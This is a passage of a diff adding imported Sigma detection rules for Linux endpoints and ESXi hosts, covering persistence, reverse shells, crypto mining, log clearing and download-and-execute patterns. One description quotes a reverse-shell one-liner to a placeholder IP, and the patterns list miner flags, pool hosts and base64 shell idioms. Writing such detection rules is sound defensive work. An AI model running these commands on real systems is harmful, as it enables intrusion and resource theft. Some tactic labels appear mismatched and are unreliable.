+  mitre_technique_id: T1053.003
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-effecda9
+  title: Persistence Via Sudoers Files
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects creation of sudoers file or files in "sudoers.d" directory
+    which can be used a potential method to persiste privileges for a specific user.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.TargetFilename
+      op: startswith
+      value: /etc/sudoers.d/
+    condition_logic: and
+  mitre_technique_id: T1053.003
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-4a3756ec
+  title: Suspicious Filename with Embedded Base64 Commands
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects files with specially crafted filenames that embed Base64-encoded
+    bash payloads designed to execute when processed by shell scripts. These filenames
+    exploit shell interpretation quirks to [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.TargetFilename
+      op: contains_any
+      values:
+      - '{echo'
+      - '{base64,-d}'
+    condition_logic: and
+  mitre_technique_id: T1059.004
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-d37edd48
+  title: Potentially Suspicious Shell Script Creation in Profile Folder
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects the creation of shell scripts under the "profile.d" path.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.TargetFilename
+      op: contains
+      value: /etc/profile.d/
+    - field: extra.TargetFilename
+      op: contains_any
+      values:
+      - .csh
+      - .sh
+    condition_logic: and
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-9b94983c
+  title: Triple Cross eBPF Rootkit Default LockFile
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the creation of the file "rootlog" which is used by the TripleCross
+    rootkit as a way to check if the backdoor is already running.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.TargetFilename
+      op: contains
+      value: /tmp/rootlog
+    condition_logic: and
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-42e1872e
+  title: Triple Cross eBPF Rootkit Default Persistence
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the creation of "ebpfbackdoor" files in both "cron.d" and "sudoers.d"
+    directories. Which both are related to the TripleCross persistence method
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.TargetFilename
+      op: endswith
+      value: ebpfbackdoor
+    condition_logic: and
+  mitre_technique_id: T1053.003
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-071a4add
+  title: Wget Creating Files in Tmp Directory
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects the use of wget to download content in a temporary directory
+    such as "/tmp" or "/var/tmp"
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /wget
+    - field: extra.TargetFilename
+      op: contains_any
+      values:
+      - /tmp/
+      - /var/tmp/
+    condition_logic: and
+  mitre_technique_id: T1105
+  mitre_tactic: command-and-control
+- id: lr-sigma-imported-85d5a8ac
+  title: Linux Reverse Shell Indicator
+  source: sigma
+  log_type: linux_endpoint
+  severity: critical
+  description: Detects a bash contecting to a remote IP address (often found when
+    actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /bin/bash
+    - field: destination_ip
+      op: contains_any
+      values:
+      - 127.0.0.1
+      - 0.0.0.0
+      negate: true
+    condition_logic: and
+  mitre_technique_id: T1059.004
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-1d80f3fc
+  title: Linux Crypto Mining Pool Connections
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects process connections to a Monero crypto mining pool
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.DestinationHostname
+      op: contains_any
+      values:
+      - pool.minexmr.com
+      - fr.minexmr.com
+      - de.minexmr.com
+      - sg.minexmr.com
+      - ca.minexmr.com
+      - us-west.minexmr.com
+      - pool.supportxmr.com
+      - mine.c3pool.com
+      - xmr-eu1.nanopool.org
+      - xmr-eu2.nanopool.org
+      - xmr-us-east1.nanopool.org
+      - xmr-us-west1.nanopool.org
+      - xmr-asia1.nanopool.org
+      - xmr-jp1.nanopool.org
+      - xmr-au1.nanopool.org
+      - xmr.2miners.com
+      - xmr.hashcity.org
+      - xmr.f2pool.com
+      - xmrpool.eu
+      - pool.hashvault.pro
+      - moneroocean.stream
+      - monerocean.stream
+    condition_logic: and
+  mitre_technique_id: T1496
+  mitre_tactic: impact
+  flag: suspicious_process
+- id: lr-sigma-imported-1ecc1ee6
+  title: Communication To LocaltoNet Tunneling Service Initiated - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects an executable initiating a network connection to "LocaltoNet"
+    tunneling sub-domains. LocaltoNet is a reverse proxy that enables localhost services
+    to be exposed to the Internet. [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.DestinationHostname
+      op: contains_any
+      values:
+      - .localto.net
+      - .localtonet.com
+    - field: extra.Initiated
+      op: contains
+      value: 'true'
+    condition_logic: and
+  mitre_technique_id: T1572
+  mitre_tactic: command-and-control
+- id: lr-sigma-imported-2402f3d2
+  title: Communication To Ngrok Tunneling Service - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects an executable accessing an ngrok tunneling endpoint, which
+    could be a sign of forbidden exfiltration of data exfiltration by malicious actors
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.DestinationHostname
+      op: contains_any
+      values:
+      - tunnel.us.ngrok.com
+      - tunnel.eu.ngrok.com
+      - tunnel.ap.ngrok.com
+      - tunnel.au.ngrok.com
+      - tunnel.sa.ngrok.com
+      - tunnel.jp.ngrok.com
+      - tunnel.in.ngrok.com
+    condition_logic: and
+  mitre_technique_id: T1567
+- id: lr-sigma-imported-7d6a9f86
+  title: Shell Invocation via Apt - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects the use of the "apt" and "apt-get" commands to execute a shell
+    or proxy commands. Such behavior may be associated with privilege escalation,
+    unauthorized command execution, or to break [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /apt
+      - /apt-get
+    - field: extra.CommandLine
+      op: contains
+      value: APT::Update::Pre-Invoke::=
+    condition_logic: and
+  mitre_technique_id: T1083
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-3f1c8a2c
+  title: Scheduled Task/Job At
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects the use of at/atd which are utilities that are used to schedule
+    tasks. They are often abused by adversaries to maintain persistence or to perform
+    task scheduling for initial or recurring [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /at
+      - /atd
+    condition_logic: and
+  mitre_technique_id: T1053.002
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-2902174c
+  title: Audit Rules Deleted Via Auditctl
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the execution of 'auditctl' with the '-D' command line parameter,
+    which deletes all configured audit rules and watches on Linux systems. This technique
+    is commonly used by attackers to [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /auditctl
+    - field: extra.CommandLine
+      op: re
+      value: -D
+    condition_logic: and
+  mitre_technique_id: T1562.012
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-6d6e63eb
+  title: Kaspersky Endpoint Security Stopped Via CommandLine - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects execution of the Kaspersky init.d stop script on Linux systems
+    either directly or via systemctl. This activity may indicate a manual interruption
+    of the antivirus service by an [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /systemctl
+      - /bash
+      - /sh
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - stop
+      - kesl
+    condition_logic: and
+  mitre_technique_id: T1562.001
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-d715743c
+  title: Suspicious Invocation of Shell via AWK - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the execution of "awk" or it's sibling commands, to invoke
+    a shell using the system() function. This behavior is commonly associated with
+    attempts to execute arbitrary commands or [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /awk
+      - /gawk
+      - /mawk
+      - /nawk
+    - field: extra.CommandLine
+      op: contains
+      value: BEGIN {system
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /bin/bash
+      - /bin/dash
+      - /bin/fish
+      - /bin/sh
+      - /bin/zsh
+    condition_logic: and
+  mitre_technique_id: T1059
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-014a71a5
+  title: Decode Base64 Encoded Text
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects usage of base64 utility to decode arbitrary base64-encoded
+    text
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /base64
+    - field: extra.CommandLine
+      op: contains
+      value: -d
+    condition_logic: and
+  mitre_technique_id: T1027
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-e686703f
+  title: Linux Base64 Encoded Pipe to Shell
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects suspicious process command line that uses base64 encoded input
+    for execution with a shell
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.CommandLine
+      op: contains
+      value: 'base64 '
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - '| bash '
+      - '| sh '
+      - '|bash '
+      - '|sh '
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ' |sh'
+      - '| bash'
+      - '| sh'
+      - '|bash'
+    condition_logic: and
+  mitre_technique_id: T1140
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-8a4e1332
+  title: Linux Base64 Encoded Shebang In CLI
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects the presence of a base64 version of the shebang in the commandline,
+    which could indicate a malicious payload about to be decoded
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - IyEvYmluL2Jhc2
+      - IyEvYmluL2Rhc2
+      - IyEvYmluL3pza
+      - IyEvYmluL2Zpc2
+      - IyEvYmluL3No
+    condition_logic: and
+  mitre_technique_id: T1140
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-31361f9a
+  title: Bash Interactive Shell
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects execution of the bash shell with the interactive flag "-i".
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /bash
+    - field: extra.CommandLine
+      op: contains
+      value: ' -i '
+    condition_logic: and
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-558cdcf7
+  title: Enable BPF Kprobes Tracing
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects common command used to enable bpf kprobes tracing
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - echo 1 >
+      - /sys/kernel/debug/tracing/events/kprobes/
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /myprobe/enable
+      - /myretprobe/enable
+    condition_logic: and
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-90bf02c0
+  title: BPFtrace Unsafe Option Usage
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects the usage of the unsafe bpftrace option
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: bpftrace
+    - field: extra.CommandLine
+      op: contains
+      value: --unsafe
+    condition_logic: and
+  mitre_technique_id: T1059.004
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-f7c386f0
+  title: Linux Setgid Capability Set on a Binary via Setcap Utility
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects the use of the 'setcap' utility to set the 'setgid' capability
+    (cap_setgid) on a binary file. This capability allows a non privileged process
+    to make arbitrary manipulations of group IDs [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /setcap
+    - field: extra.CommandLine
+      op: contains
+      value: cap_setgid
+    condition_logic: and
+  mitre_technique_id: T1548
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-98889128
+  title: Linux Setuid Capability Set on a Binary via Setcap Utility
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects the use of the 'setcap' utility to set the 'setuid' capability
+    (cap_setuid) on a binary file. This capability allows a non privileged process
+    to make arbitrary manipulations of user IDs [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /setcap
+    - field: extra.CommandLine
+      op: contains
+      value: cap_setuid
+    condition_logic: and
+  mitre_technique_id: T1548
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-6243ac57
+  title: Capabilities Discovery - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects usage of "getcap" binary. This is often used during recon activity
+    to determine potential binaries that can be abused as GTFOBins or other.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /getcap
+    - field: extra.CommandLine
+      op: contains
+      value: ' -r '
+    condition_logic: and
+  mitre_technique_id: T1083
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-7b1ef2bd
+  title: Capsh Shell Invocation - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the use of the "capsh" utility to invoke a shell.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /capsh
+    - field: extra.CommandLine
+      op: endswith
+      value: ' --'
+    condition_logic: and
+  mitre_technique_id: T1059
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-655eb676
+  title: Remove Immutable File Attribute
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects usage of the 'chattr' utility to remove immutable file attribute.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /chattr
+    - field: extra.CommandLine
+      op: contains
+      value: ' -i '
+    condition_logic: and
+  mitre_technique_id: T1222.002
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-f3639bc0
+  title: Linux Sudo Chroot Execution
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects the execution of 'sudo' command with '--chroot' option, which
+    is used to change the root directory for command execution. Attackers may use
+    this technique to evade detection and execute [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /sudo
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ' --chroot '
+      - 'sudo -R '
+    condition_logic: and
+  mitre_technique_id: T1068
+  mitre_tactic: privilege-escalation
+  flag: privilege_escalation
+- id: lr-sigma-imported-7e9c152b
+  title: Clear Linux Logs
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects attempts to clear logs on the system. Adversaries may clear
+    system logs to hide evidence of an intrusion
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /rm
+      - /shred
+      - /unlink
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /var/log
+      - /var/spool/mail
+    condition_logic: and
+  mitre_technique_id: T1070.002
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-a458e6e3
+  title: Clipboard Collection with Xclip Tool
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects attempts to collect data stored in the clipboard from users
+    with the usage of xclip tool. Xclip has to be installed. Highly recommended using
+    rule on servers, due to high usage of [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains
+      value: xclip
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - -sel
+      - clip
+      - -o
+    condition_logic: and
+  mitre_technique_id: T1115
+  mitre_tactic: collection
+  flag: data_exfil_candidate
+- id: lr-sigma-imported-5a47e40d
+  title: Copy Passwd Or Shadow From TMP Path
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects when the file "passwd" or "shadow" is copied from tmp path
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /cp
+    - field: extra.CommandLine
+      op: contains
+      value: /tmp/
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - passwd
+      - shadow
+    condition_logic: and
+  mitre_technique_id: T1552.001
+  mitre_tactic: credential-access
+  flag: credential_access
+- id: lr-sigma-imported-14f77d9c
+  title: Crontab Enumeration
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects usage of crontab to list the tasks of the user
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /crontab
+    - field: extra.CommandLine
+      op: contains
+      value: ' -l'
+    condition_logic: and
+  mitre_technique_id: T1007
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-b55ed349
+  title: Remove Scheduled Cron Task/Job
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects usage of the 'crontab' utility to remove the current crontab.
+    This is a common occurrence where cryptocurrency miners compete against each other
+    by removing traces of other miners to [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: crontab
+    - field: extra.CommandLine
+      op: contains
+      value: ' -r'
+    condition_logic: and
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-83d1d012
+  title: Linux Crypto Mining Indicators
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects command line parameters or strings often used by crypto miners
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ' --cpu-priority='
+      - --donate-level=0
+      - ' -o pool.'
+      - ' --nicehash'
+      - ' --algo=rx/0 '
+      - stratum+tcp://
+      - stratum+udp://
+      - sh -c /sbin/modprobe msr allow_writes=on
+      - LS1kb25hdGUtbGV2ZWw9
+      - 0tZG9uYXRlLWxldmVsP
+      - tLWRvbmF0ZS1sZXZlbD
+      - c3RyYXR1bSt0Y3A6Ly
+      - N0cmF0dW0rdGNwOi8v
+      - zdHJhdHVtK3RjcDovL
+      - c3RyYXR1bSt1ZHA6Ly
+      - N0cmF0dW0rdWRwOi8v
+      - zdHJhdHVtK3VkcDovL
+    condition_logic: and
+  mitre_technique_id: T1496
+  mitre_tactic: impact
+  flag: suspicious_process
+- id: lr-sigma-imported-115db500
+  title: Curl Usage on Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects a curl process start on linux, which indicates a file download
+    from a remote location or a simple web request to a remote server
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /curl
+    condition_logic: and
+  mitre_technique_id: T1105
+  mitre_tactic: command-and-control
+- id: lr-sigma-imported-e2266280
+  title: Suspicious Download and Execute Pattern via Curl/Wget
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects suspicious use of command-line tools such as curl or wget to
+    download remote content - particularly scripts - into temporary directories (e.g.,
+    /dev/shm, /tmp), followed by immediate [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /curl
+      - /wget
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /tmp/
+      - /dev/shm/
+    - field: extra.CommandLine
+      op: contains
+      value: sh -c
+    condition_logic: and
+  mitre_technique_id: T1059.004
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-340c3743
+  title: DD File Overwrite
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects potential overwriting and deletion of a file using DD.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /bin/dd
+      - /usr/bin/dd
+    - field: extra.CommandLine
+      op: contains
+      value: of=
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - if=/dev/zero
+      - if=/dev/null
+    condition_logic: and
+  mitre_technique_id: T1485
+  mitre_tactic: impact
+  flag: suspicious_process
+- id: lr-sigma-imported-d989dab6
+  title: Potential Linux Process Code Injection Via DD Utility
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects the injection of code by overwriting the memory map of a Linux
+    process using the "dd" Linux command.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /dd
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - of=
+      - /proc/
+      - /mem
+    condition_logic: and
+  mitre_technique_id: T1055.009
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-de8fb210
+  title: Ufw Force Stop Using Ufw-Init
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects attempts to force stop the ufw using ufw-init
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - -ufw-init
+      - force-stop
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - ufw
+      - disable
+    condition_logic: or
+  mitre_technique_id: T1562.004
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-4c2b6a22
+  title: Linux Doas Tool Execution
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects the doas tool execution in linux host platform. This utility
+    tool allow standard users to perform tasks as root, the same way sudo does.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /doas
+    condition_logic: and
+  mitre_technique_id: T1548
+  mitre_tactic: privilege-escalation
+  flag: privilege_escalation
+- id: lr-sigma-imported-1b997bb2
+  title: Shell Invocation via Env Command - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the use of the env command to invoke a shell. This may indicate
+    an attempt to bypass restricted environments, escalate privileges, or execute
+    arbitrary commands.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /env
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /bin/bash
+      - /bin/dash
+      - /bin/fish
+      - /bin/sh
+      - /bin/zsh
+    condition_logic: and
+  mitre_technique_id: T1059
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-cbb9ebaa
+  title: ESXi Network Configuration Discovery Via ESXCLI
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects execution of the "esxcli" command with the "network" flag in
+    order to retrieve information about the network configuration.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /esxcli
+    - field: extra.CommandLine
+      op: contains
+      value: network
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ' get'
+      - ' list'
+    condition_logic: and
+  mitre_technique_id: T1033
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-169f44d8
+  title: ESXi Admin Permission Assigned To Account Via ESXCLI
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects execution of the "esxcli" command with the "system" and "permission"
+    flags in order to assign admin permissions to an account.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /esxcli
+    - field: extra.CommandLine
+      op: contains
+      value: system
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - ' permission '
+      - ' set'
+      - Admin
+    condition_logic: and
+  mitre_technique_id: T1059.012
+  mitre_tactic: privilege-escalation
+  flag: privilege_escalation
+- id: lr-sigma-imported-73d52c4f
+  title: ESXi Storage Information Discovery Via ESXCLI
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects execution of the "esxcli" command with the "storage" flag in
+    order to retrieve information about the storage status and other related information.
+    Seen used by malware such as DarkSide [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /esxcli
+    - field: extra.CommandLine
+      op: contains
+      value: storage
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ' get'
+      - ' list'
+    condition_logic: and
+  mitre_technique_id: T1033
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-5092e28a
+  title: ESXi Syslog Configuration Change Via ESXCLI
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects changes to the ESXi syslog configuration via "esxcli"
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /esxcli
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - system
+      - syslog
+      - config
+    - field: extra.CommandLine
+      op: contains
+      value: ' set'
+    condition_logic: and
+  mitre_technique_id: T1562.001
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-9dd11958
+  title: ESXi System Information Discovery Via ESXCLI
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects execution of the "esxcli" command with the "system" flag in
+    order to retrieve information about the different component of the system. Such
+    as accounts, modules, NTP, etc.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /esxcli
+    - field: extra.CommandLine
+      op: contains
+      value: system
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ' get'
+      - ' list'
+    condition_logic: and
+  mitre_technique_id: T1033
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-da5dbed3
+  title: ESXi Account Creation Via ESXCLI
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects user account creation on ESXi system via esxcli
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /esxcli
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - 'system '
+      - 'account '
+      - 'add '
+    condition_logic: and
+  mitre_technique_id: T1136
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-108501a0
+  title: ESXi VM List Discovery Via ESXCLI
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects execution of the "esxcli" command with the "vm" flag in order
+    to retrieve information about the installed VMs.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /esxcli
